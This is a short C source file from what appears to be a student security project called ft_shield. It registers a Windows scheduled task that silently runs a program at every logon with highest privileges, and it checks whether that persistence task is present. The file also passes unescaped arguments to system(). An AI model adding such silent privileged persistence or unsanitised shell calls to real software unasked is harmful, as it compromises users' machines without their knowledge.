/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   task.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/10/20 17:03:38 by zcadinot          #+#    #+#             */
/*   Updated: 2026/10/20 17:24:05 by zcadinot         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_shield.h"
#include <stdlib.h>
#include <stdio.h>

#define TASK_NAME "ft_shield_task"

int task_install(const char *path, const char *arg)
{
    char cmd[4096];

    snprintf(cmd, sizeof(cmd),
            "schtasks /create /sc ONLOGON "
            "/tn \"%s\" "
            "/tr \"\\\"%s\\\" %s\" "
            "/rl HIGHEST "
            "/f >nul 2>&1",
            TASK_NAME, path, arg);

    return (system(cmd) == 0);
}

int persistence_task_detect(void)
{
    char cmd[512];

    snprintf(cmd, sizeof(cmd),
        "schtasks /query /tn \"%s\" >nul 2>&1",
        TASK_NAME);

    return (system(cmd) == 0);
}
